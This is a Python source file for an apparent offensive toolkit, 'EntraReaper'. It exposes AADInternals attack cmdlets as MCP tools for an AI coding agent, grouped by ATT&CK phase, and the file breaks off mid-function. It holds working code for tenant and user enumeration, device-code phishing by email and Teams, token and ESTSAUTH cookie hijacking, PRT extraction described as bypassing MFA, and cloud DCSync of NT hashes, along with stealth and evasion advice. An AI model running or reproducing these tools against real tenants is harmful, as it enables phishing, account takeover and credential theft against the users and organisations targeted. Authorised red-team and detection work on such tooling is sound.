"""
EntraReaper — Entra ID offensive security toolkit.
Wraps 246 AADInternals cmdlets into ~35 MCP tools organized by MITRE ATT&CK phase.

Architecture:
  Claude Code <-stdio-> MCP Server (Python/FastMCP) -> pwsh 7 + AADInternals
  (Uses asyncio.create_subprocess_exec — no shell, safe from injection)

Requirements:
  - macOS with PowerShell 7: brew install powershell
  - AADInternals module: pwsh -c 'Install-Module AADInternals -Scope CurrentUser -Force'
  - Python 3.11+ with: pip install "mcp[cli]" pydantic
"""

import json
import logging
from mcp.server.fastmcp import FastMCP

from entrareaper.bridge import PSBridge, LONG_TIMEOUT
from entrareaper.token_store import TokenStore, Token, TOKEN_CMDLET_MAP, RESOURCE_MAP
from entrareaper.opsec import get_opsec_profile, get_all_profiles
from entrareaper.engagement_store import (
    save_fingerprint, save_recon_result, update_attack_surface,
    save_signal, save_user_enum, save_implicit_grant_results,
    save_token, save_credential, save_cert_reference,
    log_noise, add_persistence, log_playbook_entry,
    get_folder_status,
    FINGERPRINTS_DIR, BEHAVIOR_DIR, RESULTS_DIR, SIGNALS_DIR,
    TOKENS_DIR, LOOT_DIR, CREDS_DIR, CERTS_DIR,
    NOISE_DIR, PERSISTENCE_DIR, PLAYBOOKS_DIR, REPORTS_DIR,
)
from entrareaper.modules.opsec_governor import (
    check_budget, spend_budget, get_budget_report, set_budget, reset_budget,
)
from entrareaper.modules.evasion import (
    get_user_agent, apply_jitter, get_foci_pivot_targets,
    suggest_audience_switch, FOCI_FAMILY,
)
from entrareaper.modules.analyzer import (
    analyze_ca_policies, find_privesc_paths, build_access_graph, rank_attack_paths,
)
from entrareaper.modules.reporter import (
    generate_report, generate_mitre_layer, generate_evidence_package,
    generate_cleanup_checklist, generate_kill_chain_narrative,
)

logging.basicConfig(level=logging.INFO, format="%(name)s | %(levelname)s | %(message)s")
logger = logging.getLogger("entrareaper")

# Initialize components
mcp = FastMCP("EntraReaper")
bridge = PSBridge()
tokens = TokenStore()


# ---------------------------------------------------------------
# Helper to format results consistently
# ---------------------------------------------------------------

def _format_result(result, tool_name: str = "") -> str:
    """Format a PSResult into a readable MCP response."""
    if not result.success:
        return json.dumps({
            "status": "error",
            "tool": tool_name,
            "error": result.error,
            "raw_stderr": result.raw_error[:2000] if result.raw_error else None,
            "duration_ms": result.duration_ms,
        }, indent=2)

    return json.dumps({
        "status": "success",
        "tool": tool_name,
        "data": result.data,
        "duration_ms": result.duration_ms,
    }, indent=2, default=str)


# ---------------------------------------------------------------
# SESSION and ENVIRONMENT TOOLS
# ---------------------------------------------------------------

@mcp.tool()
async def session_status() -> str:
    """
    Check environment status: pwsh availability, AADInternals module version,
    and list all cached tokens with their expiry status.
    """
    env_result = await bridge.verify_environment()
    token_list = tokens.list_tokens()

    return json.dumps({
        "environment": {
            "pwsh_available": env_result.success,
            "module_info": env_result.data if env_result.success else env_result.error,
        },
        "tokens": {
            "count": len(token_list),
            "tokens": token_list,
        },
    }, indent=2, default=str)


@mcp.tool()
async def session_clear_tokens() -> str:
    """Clear all cached tokens from the token store."""
    count = tokens.clear()
    return json.dumps({"status": "success", "tokens_removed": count})


@mcp.tool()
async def opsec_check(tool_name: str) -> str:
    """
    Get the OPSEC profile for a tool before running it.
    Shows: noise level, what logs are generated, detection risk, and evasion notes.

    Args:
        tool_name: Name of the tool to check (e.g., 'recon_tenant', 'persist_federation').
                   Use 'all' to get every profile.
    """
    if tool_name == "all":
        return json.dumps(get_all_profiles(), indent=2)
    return json.dumps(get_opsec_profile(tool_name), indent=2)


@mcp.tool()
async def engagement_status() -> str:
    """
    Show the current state of all engagement folders: fingerprints, behavior profiles,
    results, IOCs, signals, scenarios, and reference data.
    Lists file counts and filenames for each folder.
    """
    status = get_folder_status()
    return json.dumps(status, indent=2)


# ---------------------------------------------------------------
# PHASE 1: RECONNAISSANCE — UNAUTHENTICATED (T1589, T1590)
# ---------------------------------------------------------------

@mcp.tool()
async def recon_tenant(domain: str) -> str:
    """
    Full unauthenticated tenant reconnaissance from a domain name.
    Returns: tenant ID, federation type, brand name, auth endpoints, MX/DNS, MDI instance.
    No authentication required — uses public Microsoft APIs.
    OPSEC: Silent. Zero logs generated.

    Cmdlets: Invoke-AADIntReconAsOutsider, Get-AADIntLoginInformation, Get-AADIntTenantId

    Args:
        domain: Target domain (e.g., 'contoso.com')
    """
    result = await bridge.execute("Invoke-AADIntReconAsOutsider", {"DomainName": domain}, timeout=60)

    # Auto-save: fingerprint + result
    if result.success and result.data and isinstance(result.data, dict):
        try:
            save_fingerprint(domain, result.data)
            save_recon_result(domain, "S01-tenant", result.data, summary=f"Tenant recon for {domain}")
            update_attack_surface(domain, "S01-TenantRecon", {
                "tenant_id": result.data.get("TenantId", "unknown"),
                "brand": result.data.get("TenantBrandName", "unknown"),
                "auth_type": str(result.data.get("AuthType", "unknown")),
                "desktop_sso": str(result.data.get("DesktopSsoEnabled", "unknown")),
            })
        except Exception as e:
            logger.warning(f"Auto-save failed for recon_tenant: {e}")

    return _format_result(result, "recon_tenant")


@mcp.tool()
async def recon_users(domain: str, usernames: list[str], method: str = "normal") -> str:
    """
    Enumerate valid users in a tenant using GetCredentialType API.
    No authentication required. No lockout risk. No sign-in logs generated.
    OPSEC: Low noise. Rate limit to less than 10/sec for stealth.

    Cmdlet: Invoke-AADIntUserEnumerationAsOutsider

    Args:
        domain: Target domain (e.g., 'contoso.com')
        usernames: List of usernames to check (without @domain)
        method: Enumeration method — 'normal', 'login', 'autologon'
    """
    # Build the user list as UPNs
    upn_list = [f"{u}@{domain}" if "@" not in u else u for u in usernames]

    # Build PS array safely via sanitized strings
    sanitized = [u.replace("'", "''") for u in upn_list]
    user_array = ",".join(f"'{u}'" for u in sanitized)
    safe_method = method.replace("'", "''")

    script = f"""
$users = @({user_array})
$results = Invoke-AADIntUserEnumerationAsOutsider -UserName $users -Method {safe_method}
$results | ConvertTo-Json -Depth 5 -Compress
"""
    result = await bridge.execute_script(script, timeout=LONG_TIMEOUT)

    # Auto-save: user enum results to behavior profile
    if result.success and result.data:
        try:
            data_list = result.data if isinstance(result.data, list) else [result.data]
            valid = [u.get("UserName", "") for u in data_list if u.get("Exists") is True]
            total = len(data_list)
            throttled = len(upn_list) - total
            if valid:
                save_user_enum(domain, valid, total, throttled)
                save_recon_result(domain, "S03-users", {
                    "valid_users": valid, "total_tested": total, "throttled": throttled,
                })
        except Exception as e:
            logger.warning(f"Auto-save failed for recon_users: {e}")

    return _format_result(result, "recon_users")


@mcp.tool()
async def recon_domains(domain: str) -> str:
    """
    Get all domains registered to a tenant via OpenID autodiscovery.
    No authentication required.
    OPSEC: Silent.

    Cmdlet: Get-AADIntTenantDomains

    Args:
        domain: Any known domain for the tenant
    """
    result = await bridge.execute("Get-AADIntTenantDomains", {"Domain": domain})

    # Auto-save: domain inventory
    if result.success and result.data:
        try:
            domains_list = result.data if isinstance(result.data, list) else [result.data]
            update_attack_surface(domain, "S02-DomainInventory", {
                "domain_count": str(len(domains_list)),
                "domains": ", ".join(f"`{d}`" for d in domains_list[:20]),
            })
            save_recon_result(domain, "S02-domains", {"domains": domains_list})
        except Exception as e:
            logger.warning(f"Auto-save failed for recon_domains: {e}")

    return _format_result(result, "recon_domains")


@mcp.tool()
async def recon_openid(domain: str) -> str:
    """
    Get OpenID Connect configuration for a domain.
    Returns: authorization/token endpoints, signing keys, issuer.
    OPSEC: Silent.

    Cmdlet: Get-AADIntOpenIDConfiguration

    Args:
        domain: Target domain
    """
    result = await bridge.execute("Get-AADIntOpenIDConfiguration", {"Domain": domain})

    # Auto-save: update fingerprint with OIDC data + behavior profile
    if result.success and result.data and isinstance(result.data, dict):
        try:
            save_fingerprint(domain, result.data)
            save_recon_result(domain, "S06-openid", result.data, summary=f"OpenID config for {domain}")
            rt = result.data.get("response_types_supported", [])
            mrt = result.data.get("microsoft_multi_refresh_token", False)
            update_attack_surface(domain, "S06-OpenIDConfig", {
                "implicit_grant": "enabled" if "token" in rt else "disabled",
                "response_types": ", ".join(rt) if isinstance(rt, list) else str(rt),
                "multi_refresh_token": str(mrt),
                "foci_exploitable": str(mrt),
                "region": result.data.get("tenant_region_scope", "unknown"),
                "signing_alg": ", ".join(result.data.get("id_token_signing_alg_values_supported", [])),
            })
        except Exception as e:
            logger.warning(f"Auto-save failed for recon_openid: {e}")

    return _format_result(result, "recon_openid")


@mcp.tool()
async def recon_dns(domain: str) -> str:
    """
    DNS-based reconnaissance: MX records, autodiscover, federation endpoints.
    OPSEC: Silent — standard DNS queries.

    Cmdlets: Get-AADIntLoginInformation, Get-AADIntTenantId, Get-AADIntEndpointInstances

    Args:
        domain: Target domain
    """
    safe_domain = domain.replace("'", "''")
    script = f"""
$loginInfo = Get-AADIntLoginInformation -Domain '{safe_domain}'
$results = @{{
    LoginInfo = $loginInfo
    TenantId = Get-AADIntTenantId -Domain '{safe_domain}'
}}
try {{
    $results.Endpoints = Get-AADIntEndpointInstances
}} catch {{ }}
$results | ConvertTo-Json -Depth 5 -Compress
"""
    result = await bridge.execute_script(script)
    return _format_result(result, "recon_dns")


# ---------------------------------------------------------------
# PHASE 2: RECONNAISSANCE — AUTHENTICATED (T1087.004, T1518.001)
# ---------------------------------------------------------------

@mcp.tool()
async def recon_insider(token_alias: str, scope: str = "full") -> str:
    """
    Full authenticated insider reconnaissance of a tenant.
    Returns: all users, groups, apps, roles, domains, policies, sync config.
    OPSEC: Medium noise — bulk enumeration may trigger anomaly detection.

    Cmdlet: Invoke-AADIntReconAsInsider

    Args:
        token_alias: Alias of stored access token to use (e.g., 'graph')
        scope: 'full' (all objects) or 'quick' (summary only)
    """
    token_val = tokens.get_value(token_alias)
    if not token_val:
        return json.dumps({"error": f"Token '{token_alias}' not found. Use cred_token to obtain one first."})

    safe_token = token_val.replace("'", "''")

    if scope == "quick":
        script = f"""
$token = '{safe_token}'
$details = Get-AADIntTenantDetails -AccessToken $token
$globals = Get-AADIntGlobalAdmins -AccessToken $token
@{{
    TenantDetails = $details
    GlobalAdmins = $globals
}} | ConvertTo-Json -Depth 5 -Compress
"""
    else:
        script = f"""
$token = '{safe_token}'
$results = Invoke-AADIntReconAsInsider -AccessToken $token
$results | ConvertTo-Json -Depth 10 -Compress
"""
    result = await bridge.execute_script(script, timeout=LONG_TIMEOUT)
    return _format_result(result, "recon_insider")


@mcp.tool()
async def recon_guest(token_alias: str) -> str:
    """
    Tenant reconnaissance as a guest user.
    Returns: visible users, groups, apps, roles, devices, domains.
    OPSEC: Low-medium. Guest access is expected behavior.

    Cmdlet: Invoke-AADIntReconAsGuest

    Args:
        token_alias: Alias of stored guest access token
    """
    token_val = tokens.get_value(token_alias)
    if not token_val:
        return json.dumps({"error": f"Token '{token_alias}' not found."})

    result = await bridge.execute("Invoke-AADIntReconAsGuest", {"AccessToken": token_val}, timeout=LONG_TIMEOUT)
    return _format_result(result, "recon_guest")


@mcp.tool()
async def recon_ca_policies(token_alias: str) -> str:
    """
    Dump all Conditional Access policies from the tenant.
    Critical for understanding auth bypass opportunities.
    OPSEC: Medium — admin API queries are logged.

    Cmdlet: Get-AADIntConditionalAccessPolicies

    Args:
        token_alias: Alias of stored access token (needs admin or CA reader role)
    """
    token_val = tokens.get_value(token_alias)
    if not token_val:
        return json.dumps({"error": f"Token '{token_alias}' not found."})

    result = await bridge.execute("Get-AADIntConditionalAccessPolicies", {"AccessToken": token_val})
    return _format_result(result, "recon_ca_policies")


@mcp.tool()
async def recon_sync_config(token_alias: str) -> str:
    """
    Get Azure AD Connect sync configuration: PHS, PTA, SSO status, sync features.
    Critical for identifying hybrid attack paths.
    OPSEC: Medium.

    Cmdlets: Get-AADIntSyncConfiguration, Get-AADIntSyncFeatures, Get-AADIntDesktopSSO

    Args:
        token_alias: Alias of stored access token
    """
    token_val = tokens.get_value(token_alias)
    if not token_val:
        return json.dumps({"error": f"Token '{token_alias}' not found."})

    safe_token = token_val.replace("'", "''")
    script = f"""
$token = '{safe_token}'
$results = @{{}}
try {{ $results.SyncConfig = Get-AADIntSyncConfiguration -AccessToken $token }} catch {{ $results.SyncConfig = $_.Exception.Message }}
try {{ $results.SyncFeatures = Get-AADIntSyncFeatures -AccessToken $token }} catch {{ $results.SyncFeatures = $_.Exception.Message }}
try {{ $results.DesktopSSO = Get-AADIntDesktopSSO -AccessToken $token }} catch {{ $results.DesktopSSO = $_.Exception.Message }}
try {{ $results.AADConnectStatus = Get-AADIntAADConnectStatus -AccessToken $token }} catch {{ $results.AADConnectStatus = $_.Exception.Message }}
$results | ConvertTo-Json -Depth 5 -Compress
"""
    result = await bridge.execute_script(script)
    return _format_result(result, "recon_sync_config")


# ---------------------------------------------------------------
# PHASE 3: CREDENTIAL ACCESS and TOKEN MANIPULATION (T1528, T1552)
# ---------------------------------------------------------------

@mcp.tool()
async def cred_token(
    resource: str,
    method: str = "interactive",
    tenant: str = "",
    username: str = "",
    password: str = "",
    save_as: str = "",
    client_id: str = "",
) -> str:
    """
    Obtain an access token for any Microsoft resource.
    Supports: interactive, credentials, device_code, certificate.
    The token is automatically cached in the token store.
    OPSEC: Medium — sign-in event logged in Entra ID.

    Cmdlets: Get-AADIntAccessTokenFor{Resource}

    Args:
        resource: Target resource alias — one of: graph, aad_graph, exo, spo, onedrive,
                  teams, azure, intune, pta, compliance, admin, cloud_shell, partner,
                  sara, commerce, aad_join, office_apps, whfb, iam_api
        method: Auth method — 'interactive' (browser), 'credentials' (user/pass), 'device_code'
        tenant: Tenant ID or domain (optional for most methods)
        username: UPN for credentials method
        password: Password for credentials method
        save_as: Alias to save the token as (defaults to resource name)
        client_id: Custom OAuth client ID (optional)
    """
    cmdlet = TOKEN_CMDLET_MAP.get(resource)
    if not cmdlet:
        return json.dumps({
            "error": f"Unknown resource: {resource}",
            "available_resources": list(TOKEN_CMDLET_MAP.keys()),
        })

    params: dict = {}
    if tenant:
        params["Tenant"] = tenant

    if method == "credentials":
        if not username or not password:
            return json.dumps({"error": "credentials method requires username and password"})
        safe_pw = password.replace("'", "''")
        safe_user = username.replace("'", "''")
        safe_tenant = tenant.replace("'", "''") if tenant else ""
        tenant_param = f"-Tenant '{safe_tenant}'" if tenant else ""
        script = f"""
$secpw = ConvertTo-SecureString '{safe_pw}' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('{safe_user}', $secpw)
$token = {cmdlet} -Credentials $cred {tenant_param}
$token | ConvertTo-Json -Depth 5 -Compress
"""
        result = await bridge.execute_script(script)
    elif method == "device_code":
        params["Device"] = True
        if client_id:
            params["ClientId"] = client_id
        result = await bridge.execute(cmdlet, params, timeout=LONG_TIMEOUT)
    else:
        # Interactive (default)
        result = await bridge.execute(cmdlet, params, timeout=LONG_TIMEOUT)

    # Cache the token
    if result.success and result.data:
        alias = save_as or resource
        token_value = result.data if isinstance(result.data, str) else json.dumps(result.data)
        tokens.add(Token(
            alias=alias,
            resource=RESOURCE_MAP.get(resource, resource),
            token_type="access",
            value=token_value,
            tenant_id=tenant,
            user_principal_name=username,
            client_id=client_id,
            obtained_via=method,
        ))

    return _format_result(result, "cred_token")


@mcp.tool()
async def cred_device_code(
    resource: str = "graph",
    client_id: str = "",
    tenant: str = "",
    save_as: str = "",
) -> str:
    """
    Initiate device code phishing flow. Returns a code the victim must enter
    at microsoft.com/devicelogin. Once authenticated, the token is captured and cached.
    OPSEC: Low — sign-in appears legitimate. Use MS first-party client IDs for stealth.

    Cmdlet: Get-AADIntAccessTokenFor{Resource} -Device

    Args:
        resource: Target resource (graph, exo, teams, etc.)
        client_id: OAuth client ID. Leave empty for AADInternals default.
                   Stealth options: 'd3590ed6-52b3-4102-aeff-aad2292ab01c' (Office),
                   '1fec8e78-bce4-4aaf-ab1b-5451cc387264' (Teams)
        tenant: Target tenant (optional)
        save_as: Alias to save token as (defaults to resource name)
    """
    cmdlet = TOKEN_CMDLET_MAP.get(resource)
    if not cmdlet:
        return json.dumps({"error": f"Unknown resource: {resource}", "available": list(TOKEN_CMDLET_MAP.keys())})

    params: dict = {"Device": True}
    if client_id:
        params["ClientId"] = client_id
    if tenant:
        params["Tenant"] = tenant

    result = await bridge.execute(cmdlet, params, timeout=LONG_TIMEOUT)

    if result.success and result.data:
        alias = save_as or resource
        token_value = result.data if isinstance(result.data, str) else json.dumps(result.data)
        tokens.add(Token(
            alias=alias,
            resource=RESOURCE_MAP.get(resource, resource),
            token_type="access",
            value=token_value,
            tenant_id=tenant,
            obtained_via="device_code",
            client_id=client_id,
        ))

    return _format_result(result, "cred_device_code")


@mcp.tool()
async def cred_token_decode(token_alias: str = "", raw_token: str = "") -> str:
    """
    Decode and display contents of a JWT access token.
    Shows: audience, issuer, UPN, roles, scopes, expiry, tenant, app ID.

    Cmdlet: Read-AADIntAccessToken

    Args:
        token_alias: Alias of cached token to decode
        raw_token: Raw JWT string to decode (alternative to alias)
    """
    token_val = raw_token or tokens.get_value(token_alias or "")
    if not token_val:
        return json.dumps({"error": "Provide token_alias or raw_token"})

    result = await bridge.execute("Read-AADIntAccessToken", {"AccessToken": token_val})
    return _format_result(result, "cred_token_decode")


@mcp.tool()
async def cred_prt_extract(token_alias: str, prt_method: str = "keys") -> str:
    """
    Extract or create PRT (Primary Refresh Token) for device impersonation.
    PRT bypasses MFA and Conditional Access on compliant/joined devices.
    OPSEC: Medium — uses device certificate for auth.

    Cmdlets: Get-AADIntUserPRTKeys, New-AADIntUserPRTToken, New-AADIntBulkPRTToken

    Args:
        token_alias: Token alias with appropriate permissions
        prt_method: 'keys' (extract PRT keys), 'token' (create PRT JWT), 'bulk' (bulk PRT)
    """
    token_val = tokens.get_value(token_alias)
    if not token_val:
        return json.dumps({"error": f"Token '{token_alias}' not found."})

    cmdlet_map = {
        "keys": "Get-AADIntUserPRTKeys",
        "token": "New-AADIntUserPRTToken",
        "bulk": "New-AADIntBulkPRTToken",
    }
    cmdlet = cmdlet_map.get(prt_method)
    if not cmdlet:
        return json.dumps({"error": f"Unknown prt_method: {prt_method}. Use: keys, token, bulk"})

    result = await bridge.execute(cmdlet, {"AccessToken": token_val})

    if result.success and result.data:
        prt_alias = f"prt_{prt_method}"
        prt_value = result.data if isinstance(result.data, str) else json.dumps(result.data)
        tokens.add(Token(
            alias=prt_alias,
            resource="prt",
            token_type="prt",
            value=prt_value,
            obtained_via=f"prt_{prt_method}",
        ))

    # Auto-save: creds + playbook
    if result.success:
        try:
            save_credential(token_alias, "prt_keys", token_alias,
                           {"method": prt_method, "source": "cred_prt_extract"})
            log_playbook_entry(token_alias, "cred_prt_extract", "S22", token_alias,
                               f"PRT {prt_method} extracted", "Medium", "Medium")
        except Exception as e:
            logger.warning(f"Auto-save failed for cred_prt_extract: {e}")

    return _format_result(result, "cred_prt_extract")


@mcp.tool()
async def cred_cookie(action: str = "get", cookie_value: str = "") -> str:
    """
    Work with ESTSAUTH cookies for session hijacking.
    OPSEC: Requires browser access or stolen cookie value.

    Cmdlets: Get-AADIntESTSAUTHCookie, Unprotect-AADIntEstsAuthPersistentCookie

    Args:
        action: 'get' (extract cookie), 'decode' (decrypt cookie contents)
        cookie_value: ESTSAUTH cookie value for decode action
    """
    if action == "decode" and cookie_value:
        result = await bridge.execute("Unprotect-AADIntEstsAuthPersistentCookie", {"Cookie": cookie_value})
    else:
        result = await bridge.execute("Get-AADIntESTSAUTHCookie", {})

    return _format_result(result, "cred_cookie")


@mcp.tool()
async def cred_nthash(token_alias: str) -> str:
    """
    Extract NT hashes from Azure AD using Directory Change as a Service (DCaaS).
    Equivalent to DCSync but from the cloud. Requires app with Directory.Read.All + certificate.
    OPSEC: HIGH — app auth and replication requests are logged.

    Cmdlet: Get-AADIntUserNTHash

    Args:
        token_alias: Token alias for an app with Directory.Read.All and certificate auth
    """
    token_val = tokens.get_value(token_alias)
    if not token_val:
        return json.dumps({"error": f"Token '{token_alias}' not found."})

    result = await bridge.execute("Get-AADIntUserNTHash", {"AccessToken": token_val}, timeout=LONG_TIMEOUT)

    if result.success:
        try:
            save_credential(token_alias, "nthashes", "all_users",
                           {"source": "cloud_dcsync", "tool": "cred_nthash"})
            log_playbook_entry(token_alias, "cred_nthash", "S23", "all_users",
                               "Cloud DCSync — NT hashes extracted", "HIGH", "HIGH")
            log_noise(token_alias, "cred_nthash", "high", "high",
                      "App auth + DCaaS replication logged")
        except Exception as e:
            logger.warning(f"Auto-save failed for cred_nthash: {e}")

    return _format_result(result, "cred_nthash")


@mcp.tool()
async def cred_mfa_read(token_alias: str, user: str) -> str:
    """
    Read a user's MFA settings: methods, phone numbers, authenticator app details.
    OPSEC: Medium — admin API call logged.

    Cmdlets: Get-AADIntUserMFA, Get-AADIntUserMFAApps

    Args:
        token_alias: Admin-level token alias
        user: Target user UPN or ObjectID
    """
    token_val = tokens.get_value(token_alias)
    if not token_val:
        return json.dumps({"error": f"Token '{token_alias}' not found."})

    safe_token = token_val.replace("'", "''")
    safe_user = user.replace("'", "''")
    script = f"""
$token = '{safe_token}'
$results = @{{}}
try {{ $results.MFA = Get-AADIntUserMFA -AccessToken $token -UserPrincipalName '{safe_user}' }} catch {{ $results.MFA = $_.Exception.Message }}
try {{ $results.MFAApps = Get-AADIntUserMFAApps -AccessToken $token -UserPrincipalName '{safe_user}' }} catch {{ $results.MFAApps = $_.Exception.Message }}
$results | ConvertTo-Json -Depth 5 -Compress
"""
    result = await bridge.execute_script(script)
    return _format_result(result, "cred_mfa_read")


# ---------------------------------------------------------------
# PHASE 4: INITIAL ACCESS and PHISHING (T1566, T1078)
# ---------------------------------------------------------------

@mcp.tool()
async def access_phishing(
    targets: list[str],
    subject: str = "Action Required",
    message: str = "",
    sender: str = "",
    save_as: str = "phished",
) -> str:
    """
    Send device code phishing emails. Victims authenticate at microsoft.com/devicelogin
    and their tokens are captured.
    OPSEC: Low on auth side (device code flow). Email delivery may trigger mail filters.

    Cmdlet: Invoke-AADIntPhishing

    Args:
        targets: List of target email addresses
        subject: Email subject line
        message: Custom HTML message body (optional)
        sender: Sender email address (optional)
        save_as: Alias to save captured token as
    """
    sanitized_targets = [t.replace("'", "''") for t in targets]
    target_array = ",".join(f"'{t}'" for t in sanitized_targets)
    safe_subject = subject.replace("'", "''")

    script_lines = [
        f"$params = @{{",
        f"  Recipients = @({target_array})",
        f"  Subject = '{safe_subject}'",
    ]
    if message:
        safe_msg = message.replace("'", "''")
        script_lines.append(f"  Message = '{safe_msg}'")
    if sender:
        safe_sender = sender.replace("'", "''")
        script_lines.append(f"  Sender = '{safe_sender}'")
    script_lines.append("}")
    script_lines.append("$token = Invoke-AADIntPhishing @params")
    script_lines.append("$token | ConvertTo-Json -Depth 5 -Compress")

    result = await bridge.execute_script("\n".join(script_lines), timeout=LONG_TIMEOUT)

    if result.success and result.data:
        token_value = result.data if isinstance(result.data, str) else json.dumps(result.data)
        tokens.add(Token(
            alias=save_as,
            resource="phished",
            token_type="access",
            value=token_value,
            obtained_via="phishing",
        ))

    # Auto-save: phishing campaign tracking
    if result.success:
        try:
            log_playbook_entry("phishing", "access_phishing", "S25", ", ".join(targets[:3]),
                               f"Phishing sent to {len(targets)} targets", "Medium", "Medium")
            for t in targets:
                add_persistence("phishing", "phished_token", t,
                               "access_phishing", f"Token alias: {save_as}",
                               "Revoke refresh token for user")
        except Exception as e:
            logger.warning(f"Auto-save failed for access_phishing: {e}")

    return _format_result(result, "access_phishing")


@mcp.tool()
async def access_phishing_teams(
    token_alias: str,
    targets: list[str],
    message: str = "",
    external: bool = False,
    save_as: str = "phished_teams",
) -> str:
    """
    Send device code phishing via Microsoft Teams messages (internal or external).
    Victim receives a Teams message with a device code link. More trusted than email.
    OPSEC: Medium — Teams messages logged, but appear as normal communication.

    Cmdlet: Invoke-AADIntPhishing -Teams

    Args:
        token_alias: Token with Teams messaging permissions
        targets: List of target UPNs
        message: Custom message body (optional, default includes device code)
        external: True to send as external message (requires tenant allows external)
        save_as: Alias for captured token
    """
    token_val = tokens.get_value(token_alias)
    if not token_val:
        return json.dumps({"error": f"Token '{token_alias}' not found."})

    sanitized = [t.replace("'", "''") for t in targets]
    target_array = ",".join(f"'{t}'" for t in sanitized)

    script_parts = [
        f"$params = @{{",
        f"  Recipients = @({target_array})",
        f"  Teams = $true",
        f"  SaveToCache = $true",
    ]
    if message:
        safe_msg = message.replace("'", "''")
        script_parts.append(f"  Message = '{safe_msg}'")
    if external:
        script_parts.append(f"  External = $true")
    script_parts.append("}")
    script_parts.append("$token = Invoke-AADIntPhishing @params")
    script_parts.append("$token | ConvertTo-Json -Depth 5 -Compress")

    result = await bridge.execute_script("\n".join(script_parts), timeout=LONG_TIMEOUT)

    if result.success and result.data:
        token_value = result.data if isinstance(result.data, str) else json.dumps(result.data)
        tokens.add(Token(
            alias=save_as,
            resource="phished_teams",
            token_type="access",
            value=token_value,
            obtained_via="teams_phishing",
        ))

    try:
        log_playbook_entry(token_alias, "access_phishing_teams", "S43", ", ".join(targets[:3]),
                           f"Teams phishing to {len(targets)} targets (external={external})",
                           "Medium", "Medium")
    except Exception:
        pass

    return _format_result(result, "access_phishing_teams")


@mcp.tool()
async def cred_token_universal(
    resource: str = "https://graph.microsoft.com",
    client_id: str = "d3590ed6-52b3-4102-aeff-aad2292ab01c",
    method: str = "device_code",
    tenant: str = "",
    save_as: str = "",
    refresh_token: str = "",
    saml_token: str = "",
    prt_token: str = "",
    kerberos_ticket: str = "",
    estsauth_cookie: str = "",
    otp_secret: str = "",
    tap: str = "",
    certificate_path: str = "",
    certificate_password: str = "",
    include_refresh_token: bool = True,
    force_mfa: bool = False,
) -> str:
    """
    Universal token acquisition — the Swiss Army knife. Supports ALL auth methods:
    device_code, credentials, SAML, PRT, Kerberos, cookie, OTP, TAP, certificate, IMDS.
    Any resource, any client ID, any flow.

    Cmdlet: Get-AADIntAccessToken (the master cmdlet with 30+ parameters)

    Args:
        resource: Target resource URL (e.g., 'https://graph.microsoft.com')
        client_id: OAuth client ID. Default: Microsoft Office. Use FOCI IDs for stealth.
        method: Auth flow — 'device_code', 'interactive', 'refresh_token', 'saml',
                'prt', 'kerberos', 'cookie', 'certificate', 'imds'
        tenant: Tenant ID or domain (optional)
        save_as: Alias to cache token (defaults to resource-based name)
        refresh_token: Refresh token for FOCI pivot or token renewal
        saml_token: SAML token for federated auth
        prt_token: PRT for device-based auth
        kerberos_ticket: Kerberos ticket for Seamless SSO
        estsauth_cookie: ESTSAUTH cookie for session hijack
        otp_secret: TOTP secret for MFA bypass (from persist_mfa_app)
        tap: Temporary Access Pass
        certificate_path: Path to .pfx certificate file
        certificate_password: Certificate password
        include_refresh_token: Request refresh token (for FOCI pivot)
        force_mfa: Force MFA prompt (test MFA bypass methods)
    """
    safe_resource = resource.replace("'", "''")
    safe_client = client_id.replace("'", "''")

    script_parts = [
        f"$params = @{{",
        f"  Resource = '{safe_resource}'",
        f"  ClientId = '{safe_client}'",
        f"  SaveToCache = $true",
        f"  IncludeRefreshToken = ${str(include_refresh_token).lower()}",
    ]

    if tenant:
        script_parts.append(f"  Tenant = '{tenant.replace(chr(39), chr(39)+chr(39))}'")

    if method == "device_code":
        script_parts.append(f"  UseDeviceCode = $true")
    elif method == "imds":
        script_parts.append(f"  UseIMDS = $true")
    elif method == "refresh_token" and refresh_token:
        script_parts.append(f"  RefreshToken = '{refresh_token.replace(chr(39), chr(39)+chr(39))}'")
    elif method == "saml" and saml_token:
        script_parts.append(f"  SAMLToken = '{saml_token.replace(chr(39), chr(39)+chr(39))}'")
    elif method == "prt" and prt_token:
        script_parts.append(f"  PRTToken = '{prt_token.replace(chr(39), chr(39)+chr(39))}'")
    elif method == "kerberos" and kerberos_ticket:
        script_parts.append(f"  KerberosTicket = '{kerberos_ticket.replace(chr(39), chr(39)+chr(39))}'")
    elif method == "cookie" and estsauth_cookie:
        script_parts.append(f"  ESTSAUTH = '{estsauth_cookie.replace(chr(39), chr(39)+chr(39))}'")
    elif method == "certificate" and certificate_path:
        script_parts.append(f"  PfxFileName = '{certificate_path.replace(chr(39), chr(39)+chr(39))}'")
        if certificate_password:
            script_parts.append(f"  PfxPassword = '{certificate_password.replace(chr(39), chr(39)+chr(39))}'")

    if otp_secret:
        script_parts.append(f"  OTPSecretKey = '{otp_secret.replace(chr(39), chr(39)+chr(39))}'")
    if tap:
        script_parts.append(f"  TAP = '{tap.replace(chr(39), chr(39)+chr(39))}'")
    if force_mfa:
        script_parts.append(f"  ForceMFA = $true")

    script_parts.append("}")
    script_parts.append("$token = Get-AADIntAccessToken @params")
    script_parts.append("$token | ConvertTo-Json -Depth 5 -Compress")

    result = await bridge.execute_script("\n".join(script_parts), timeout=LONG_TIMEOUT)

    if result.success and result.data:
        alias = save_as or method
        token_value = result.data if isinstance(result.data, str) else json.dumps(result.data)
        tokens.add(Token(
            alias=alias,
            resource=resource,
            token_type="access",
            value=token_value,
            obtained_via=method,
            client_id=client_id,
            tenant_id=tenant,
        ))
        try:
            save_token(tenant or "unknown", alias, {
                "resource": resource, "client_id": client_id,
                "obtained_via": method, "tenant": tenant,
            })
            log_playbook_entry(tenant or "unknown", "cred_token_universal", "S17-S24",
                               resource, f"Token obtained via {method}", "Medium", "Medium")
        except Exception:
            pass

    return _format_result(result, "cred_token_universal")


@mcp.tool()
async def cred_token_refresh(
    refresh_token_alias: str = "",
    raw_refresh_token: str = "",
    resource: str = "https://graph.microsoft.com",
    client_id: str = "d3590ed6-52b3-4102-aeff-aad2292ab01c",
    tenant: str = "",
    save_as: str = "",
) -> str:
    """
    Refresh an access token using a stored refresh token. Critical for FOCI pivot —
    use one refresh token to get access tokens for different resources.

    Cmdlet: Get-AADIntAccessTokenWithRefreshToken

    Args:
        refresh_token_alias: Alias of stored token that has a refresh token
        raw_refresh_token: Direct refresh token string (alternative)
        resource: Target resource URL for the new token
